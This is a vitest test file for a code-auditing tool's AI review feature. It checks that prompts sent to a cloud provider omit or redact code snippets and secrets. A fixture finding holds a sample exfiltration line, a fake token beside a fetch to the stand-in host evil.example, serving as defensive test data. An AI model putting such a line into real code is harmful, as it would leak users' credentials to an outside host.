import { describe, expect, it, vi } from "vitest";
import { buildAiReviewPrompt, previewProviderRequest, runAiReview } from "../src/review.js";
import type { AiProviderConfig } from "../src/types.js";
import type { AuditReport } from "@repo-auditor/scanner-core";

const config: AiProviderConfig = {
  type: "cloud",
  baseUrl: "https://api.example.test/v1",
  model: "gpt-test",
  dataSharingMode: "metadata-only",
  redactionEnabled: true,
  timeoutMs: 30000,
  retryLimit: 0
};

const report: AuditReport = {
  target: {
    type: "local-directory",
    source: "fixture",
    localPath: "fixture",
    provenance: { source: "fixture" },
    networkUsed: false,
    trustBoundary: "local"
  },
  findings: [
    {
      id: "finding-1",
      riskLevel: "High",
      category: "network",
      filePath: "src/index.ts",
      lineStart: 1,
      lineEnd: 1,
      codeSnippet: "const token = '123456:ABCdefSecretValueABCdefSecretValue'; fetch('https://evil.example')",
      explanation: "network exfiltration candidate",
      recommendedFix: "Remove sensitive payloads from outbound requests.",
      evidenceTags: ["network-endpoint", "exfiltration-candidate"],
      confidence: "High"
    }
  ],
  dataFlow: { nodes: [], edges: [] },
  risk: {
    overallRiskLevel: "High",
    decision: "Block",
    rationale: "blocking finding",
    topRisks: ["High: network exfiltration candidate"],
    severityCounts: { Critical: 0, High: 1, Medium: 0, Low: 0, Info: 0 },
    categoryCounts: { network: 1 },
    blockingFindingIds: ["finding-1"],
    residualRisk: "static only",
    scanLimitations: ["static analysis only"]
  },
  generatedAt: "2026-06-14T00:00:00.000Z",
  toolVersion: "0.1.0"
};

describe("AI review prompt", () => {
  it("omits snippets in metadata-only mode", () => {
    const prompt = buildAiReviewPrompt(report, config);

    expect(prompt).toContain("metadata-only");
    expect(prompt).not.toContain("ABCdefSecretValue");
    expect(prompt).not.toContain("codeSnippet");
  });

  it("redacts snippets when snippets are shared", () => {
    const prompt = buildAiReviewPrompt(report, { ...config, dataSharingMode: "finding-snippets" });

    expect(prompt).toContain("[REDACTED_TELEGRAM_TOKEN]");
    expect(prompt).not.toContain("ABCdefSecretValue");
  });

  it("previews provider request with the redacted prompt", () => {
    const request = previewProviderRequest(report, { ...config, dataSharingMode: "finding-snippets" });

    expect(JSON.stringify(request.body)).toContain("[REDACTED_TELEGRAM_TOKEN]");
  });

  it("runs provider review with injected fetch", async () => {
    const fetchImpl = vi.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => "",
      json: async () => ({ choices: [{ message: { content: "AI summary" } }] })
    }));

    const result = await runAiReview(report, config, fetchImpl);

    expect(result.summary).toBe("AI summary");
    expect(result.findingNotes).toEqual([
      expect.objectContaining({
        findingId: "finding-1",
        saferPattern: "Remove sensitive payloads from outbound requests."
      })
    ]);
  });
});
